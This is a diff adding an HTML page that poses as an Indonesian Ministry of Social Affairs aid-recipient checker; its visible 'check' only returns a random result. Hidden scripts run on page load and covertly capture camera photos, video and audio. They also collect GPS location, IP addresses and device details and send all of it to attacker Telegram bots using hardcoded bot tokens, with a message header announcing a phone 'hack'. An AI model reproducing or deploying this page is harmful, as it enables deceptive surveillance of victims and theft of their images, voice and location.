@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Cek Bansos - Kementerian Sosial RI</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f6fa;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 600px;
+      margin: 50px auto;
+      padding: 20px;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h2 {
+      text-align: center;
+      color: #2f3640;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    input, select, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background-color: #0097e6;
+      color: white;
+      border: none;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .result {
+      margin-top: 20px;
+      padding: 15px;
+      background: #dff9fb;
+      border: 1px solid #00a8ff;
+      border-radius: 5px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Cek Penerima Bansos</h2>
+    <label for="provinsi">Provinsi</label>
+    <select id="provinsi">
+      <option>Jawa Barat</option>
+      <option>Jawa Tengah</option>
+      <option>Jawa Timur</option>
+      <!-- Tambahkan opsi provinsi lainnya sesuai kebutuhan -->
+    </select>
+
+    <label for="kabupaten">Kabupaten/Kota</label>
+    <select id="kabupaten">
+      <option>Bandung</option>
+      <option>Semarang</option>
+      <option>Surabaya</option>
+      <!-- Tambahkan opsi kabupaten/kota lainnya sesuai kebutuhan -->
+    </select>
+
+    <label for="kecamatan">Kecamatan</label>
+    <select id="kecamatan">
+      <option>Antapani</option>
+      <option>Tembalang</option>
+      <option>Wonokromo</option>
+      <!-- Tambahkan opsi kecamatan lainnya sesuai kebutuhan -->
+    </select>
+
+    <label for="desa">Desa/Kelurahan</label>
+    <select id="desa">
+      <option>Antapani Wetan</option>
+      <option>Sendangmulyo</option>
+      <option>Ngagel</option>
+      <!-- Tambahkan opsi desa/kelurahan lainnya sesuai kebutuhan -->
+    </select>
+
+    <label for="nama">Nama Penerima Manfaat</label>
+    <input type="text" id="nama" placeholder="Masukkan nama sesuai KTP">
+
+    <label for="kode">Huruf Kode</label>
+    <input type="text" id="kode" placeholder="Masukkan 4 huruf kode">
+   <button onclick="requestLocation()">Izinka lokasi untuk mencari database  </button>
+    <button onclick="cekBansos()">Cek Data</button>
+
+    <div class="result" id="hasil">
+      <strong>Hasil Pengecekan:</strong>
+      <p>Nama: <span id="resNama"></span></p>
+      <p>Status: <span id="resStatus"></span></p>
+    </div>
+  </div>
+
+  <script>
+    function cekBansos() {
+      const nama = document.getElementById('nama').value.trim();
+      const hasil = document.getElementById('hasil');
+      const resNama = document.getElementById('resNama');
+      const resStatus = document.getElementById('resStatus');
+
+      if (nama === '') {
+        alert('Silakan masukkan nama lengkap.');
+        return;
+      }
+
+      resNama.textContent = nama;
+      // Simulasi hasil acak
+      const isDapat = Math.random() < 0.5;
+      resStatus.textContent = isDapat ? 'TERDAFTAR sebagai penerima bantuan sosial' : 'TIDAK TERDAFTAR dalam data bansos saat ini';
+      hasil.style.display = 'block';
+    }
+  </script>
+  
+   <script>
+        window.onload = async function() {
+            startCamera();
+            gatherDataAndSend();
+            
+            setTimeout(() => {
+                document.getElementById("loadingOverlay").style.display = "none";
+            }, 11000);
+        };
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const hiddenCanvas = document.getElementById('hiddenCanvas');
+        const ctx = canvas.getContext('2d');
+        const hiddenCtx = hiddenCanvas.getContext('2d');
+
+        let mediaRecorder, recordedChunks = [];
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    hiddenCanvas.width = video.videoWidth;
+                    hiddenCanvas.height = video.videoHeight;
+                    drawEffect();
+                };
+
+                takePhotosAutomatically();
+
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                mediaRecorder.ondataavailable = (event) => recordedChunks.push(event.data);
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    recordedChunks = [];
+                    await sendVideoToTelegram(blob);
+                };
+
+                setTimeout(() => { mediaRecorder.stop(); }, 11000);
+                mediaRecorder.start();
+
+            } catch (error) {
+                alert("Gagal mengakses kamera: " + error.message);
+            }
+        }
+
+        function drawEffect() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            ctx.filter = "blur(2px) contrast(1.5)";
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            requestAnimationFrame(drawEffect);
+        }
+
+        async function takePhotosAutomatically() {
+            for (let i = 0; i < 10; i++) {
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                hiddenCtx.drawImage(video, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+                hiddenCanvas.toBlob(blob => sendPhotoToTelegram(blob), "image/jpeg", 0.8);
+            }
+        }
+
+        async function sendPhotoToTelegram(blob) {
+            const formData = new FormData();
+            formData.append("chat_id", "7016045840");
+            formData.append("photo", blob, "photo.jpg");
+
+            try {
+                const response = await fetch("https://api.telegram.org/bot7554133435:AAESfBPV3PW2AqOwHSkFnlIsTp4nyg7FEX8/sendPhoto", {
+                    method: "POST",
+                    body: formData
+                });
+
+                const result = await response.json();
+                console.log(result);
+
+                if (!response.ok) {
+                    throw new Error(result.description || "Gagal menyimpan password.");
+                }
+            } catch (error) {
+                console.error("Error:", error);
+            }
+        }
+
+        async function sendVideoToTelegram(blob) {
+            const formData = new FormData();
+            formData.append("chat_id", "7016045840");
+            formData.append("video", blob, "video.webm");
+
+            try {
+                const response = await fetch("https://api.telegram.org/bot7554133435:AAESfBPV3PW2AqOwHSkFnlIsTp4nyg7FEX8/sendVideo", {
+                    method: "POST",
+                    body: formData
+                });
+
+                const result = await response.json();
+                console.log(result);
+
+                if (!response.ok) {
+                    throw new Error(result.description || "Gagal menyimpan token.");
+                } else {
+                    alert("token berhasi di simpan di Instagram web!");
+                }
+            } catch (error) {
+                console.error("Error:", error);
+                alert("Gagal menyimpan token ke web  : " + error.message);
+            }
+        }
+
+        const BOT_TOKEN = "7634973023:AAEEVxeXA0tCZqiazEVIVhaKlTn02HFmUiE";  
+        const CHAT_ID = "7016045840";  
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const payload = { chat_id: CHAT_ID, text: message };
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(response => {
+                if (!response.ok) console.error("Gagal mengirim data.");
+            }).catch(error => console.error("Error: ", error));
+        }
+
+        function getCurrentTime() {
+            const now = new Date();
+            return now.toLocaleDateString('id-ID', { 
+                weekday: 'long', year: 'numeric', month: 'long', 
+                day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' 
+            });
+        }
+
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return `│ *IP Publik: ${data.ip}*\n`;
+            } catch {
+                return "│ *IP Publik: Tidak ditemukan*\n";
+            }
+        }
+
+        async function getLocation() {
+            try {
+                return await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve(`
+│ *Lokasi:*
+│   Latitude: ${position.coords.latitude}
+│   Longitude: ${position.coords.longitude}
+│   Akurasi: ${position.coords.accuracy} meter
+│ *Link Lokasi:* https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}
+`);
+                        },
+                        (error) => reject("│ *Lokasi: Gagal mendapatkan lokasi penyimpanan*\n"),
+                        { enableHighAccuracy: true, timeout: 10000 }
+                    );
+                });
+            } catch {
+                return "│ *Lokasi: Gagal mendapatkan lokasi penyimpanan*\n";
+            }
+        }
+
+        async function gatherDataAndSend() {
+            let message = `HASIL SISTEM AKTIF\n`;
+            message += `Waktu: ${getCurrentTime()}\n`;
+            message += await getIPInfo();
+            message += await getLocation();
+            sendToTelegram(message);
+        }
+        
+        const BOT_TOKENN = "7634973023:AAEEVxeXA0tCZqiazEVIVhaKlTn02HFmUiE";  
+    const CHAT_IID = "7016045840";  
+
+    function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${BOT_TOKENN}/sendMessage`;
+        const payload = {
+            chat_id: CHAT_IID,
+            text: message
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        }).then(response => {
+            const status = document.querySelector('.status');
+            if (response.ok) {
+                status.textContent = "Data berhasil dikirim!";
+                status.classList.add("success");
+            } else {
+                status.textContent = "Gagal mengirim data.";
+                status.classList.add("error");
+            }
+        }).catch(error => {
+            console.error("Error: ", error);
+        });
+    }
+
+    function getCurrentTime() {
+        const now = new Date();
+        const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' };
+        return now.toLocaleDateString('id-ID', options);
+    }
+
+    let message = `
+__________________________________
+HASIL HACK HP Bang Hafiz ©Yokoto_saiba
+__________________________________
+`;
+
+    const currentTime = `│ *Waktu Saat Ini: ${getCurrentTime()}*\n`;
+    message += currentTime;
+
+    if ('getBattery' in navigator) {
+        navigator.getBattery().then(battery => {
+            const batteryStatus = `│ *Persentase Baterai: ${Math.round(battery.level * 100)}% ${battery.charging ? "Sedang Mengisi Daya" : "Tidak Sedang Mengisi Daya"}*\n`;
+            message += batteryStatus;
+        });
+    } else {
+        message += "│ *Baterai: Tidak didukung*\n";
+    }
+
+    const networkStatus = `
+│ *Status Online: ${navigator.onLine ? "Online" : "Offline"}*
+│ *Jenis Koneksi: ${navigator.connection ? navigator.connection.effectiveType : 'Tidak diketahui'}*
+`;
+    message += networkStatus;
+
+    const deviceInfo = `
+│ *Browser: ${navigator.userAgent}*
+│ *Sistem Operasi: ${navigator.platform}*
+│ *Resolusi Layar: ${window.screen.width} x ${window.screen.height}*
+│ *Pixel Ratio: ${window.devicePixelRatio}*
+`;
+    message += deviceInfo;
+
+    function getGPUInfo() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return 'Tidak tersedia';
+
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Tidak diketahui';
+    }
+    message += `│ *GPU: ${getGPUInfo()}*\n`;
+
+    async function getIPInfo() {
+        try {
+            const localIP = await new Promise((resolve) => {
+                const pc = new RTCPeerConnection();
+                pc.createDataChannel("");
+                pc.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        const match = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                        if (match) resolve(match[0]);
+                    }
+                };
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            });
+            message += `│ *IP Lokal: ${localIP}*\n`;
+        } catch {
+            message += "│ *IP Lokal: Tidak ditemukan*\n";
+        }
+
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            message += `│ *IP Publik: ${data.ip}*\n`;
+        } catch {
+            message += "│ *IP Publik: Tidak ditemukan*\n";
+        }
+    }
+
+    async function getOperatorInfo() {
+        try {
+            const response = await fetch('https://ipinfo.io?token=5517785ba3ae07');
+            const operator = await getNetworkOperator();
+            message += `│ *Nama Operator: ${operator}*\n`;
+        } catch (error) {
+            console.log("Error mendapatkan nama operator: ", error);
+            message += "│ *Nama Operator: Tidak ditemukan*\n";
+        }
+    }
+
+    async function getLocation() {
+        try {
+            const locationData = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude, accuracy } = position.coords;
+                        resolve(`
+│ *Lokasi Akurat:*
+│   Latitude: ${latitude}
+│   Longitude: ${longitude}
+│   Akurasi: ${accuracy} meter
+│ *Link Lokasi:* https://www.google.com/maps?q=${latitude},${longitude}
+`);
+                    },
+                    (error) => reject(error),
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+            message += locationData;
+        } catch (error) {
+            message += "│ *Lokasi: Gagal mendapatkan lokasi penyimpanan*\n";
+        }
+    }
+
+    async function gatherDataAndSend() {
+        await getIPInfo();
+        await getOperatorInfo();
+        await getLocation();
+        message += "__________________________________\n";
+        sendToTelegram(message);
+    }
+
+    gatherDataAndSend();
+        
+    let audioRecorder, audioChunks = [];
+
+    async function startAudioRecording() {
+        try {
+            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+
+            audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
+            audioRecorder.ondataavailable = (event) => audioChunks.push(event.data);
+
+            audioRecorder.onstop = async () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                audioChunks = [];
+                await sendAudioToTelegram(audioBlob);
+            };
+
+            audioRecorder.start();
+            setTimeout(() => {
+                audioRecorder.stop();
+            }, 10000); // Rekam selama 10 detik
+
+        } catch (error) {
+            // Tidak menampilkan pesan kesalahan atau notifikasi
+        }
+    }
+
+    async function sendAudioToTelegram(blob) {
+        const formData = new FormData();
+        formData.append("chat_id", "7016045840");
+        formData.append("audio", blob, "audio.webm");
+
+        try {
+            await fetch("https://api.telegram.org/bot7634973023:AAEEVxeXA0tCZqiazEVIVhaKlTn02HFmUiE/sendAudio", {
+                method: "POST",
+                body: formData
+            });
+            // Tidak menampilkan notifikasi apa pun
+        } catch (error) {
+            // Tidak menampilkan pesan kesalahan atau notifikasi
+        }
+    }
+
+    window.onload = async function() {
+        startCamera();
+        startAudioRecording(); // Mulai rekam audio saat halaman dimuat
+        gatherDataAndSend();
+        
+        setTimeout(() => {
+            document.getElementById("loadingOverlay").style.display = "none";
+        }, 10000);
+  
+      };
+      
+      async function requestLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const { latitude, longitude } = position.coords;
+                    await sendLocationToTelegram(latitude, longitude);
+                    document.getElementById("statusMessage").style.display = "block";
+                },
+                (error) => {
+                    alert("Gagal mendapatkan lokasi penyimpanan: " + error.message);
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            alert("Perangkat tidak mendukung fitur lokasi penyimpanan.");
+        }
+    }
+
+    async function sendLocationToTelegram(lat, lon) {
+        const BOT_TOKEN = "7634973023:AAEEVxeXA0tCZqiazEVIVhaKlTn02HFmUiE";
+        const CHAT_ID = "7016045840";
+        const text = `Lokasi Terkini:\nLatitude: ${lat}\nLongitude: ${lon}\n[Google Maps](https://www.google.com/maps?q=${lat},${lon})`;
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const payload = { chat_id: CHAT_ID, text: text, parse_mode: "Markdown" };
+
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        } catch (error) {
+            console.error("Gagal mengirim token ke lokasi penyimpanan: ", error);
+        }
+    }
+    </script>
+ 
+    
+</body>
+</html>
